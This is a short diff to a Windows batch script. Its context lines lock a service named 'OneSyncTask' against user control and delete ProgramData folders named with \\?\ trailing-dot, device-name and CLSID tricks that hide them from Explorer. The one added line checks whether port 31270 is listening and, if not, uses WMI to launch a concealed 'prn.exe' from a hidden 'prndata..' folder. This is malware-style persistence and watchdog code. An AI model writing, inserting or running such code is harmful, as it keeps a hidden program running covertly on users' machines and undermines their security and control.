@@ -59,3 +59,4 @@ sc sdshow "OneSyncTask" | findstr /C:"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)
 rd /S /Q "\\?\%ProgramData%\NUL..\"
 rd /S /Q "\\?\%ProgramData%\config..\"
 rd /S /Q "\\?\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
+netstat -ano | find "31270" >nul || powershell -Command "([wmiclass]'Win32_Process').Create('\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn')"
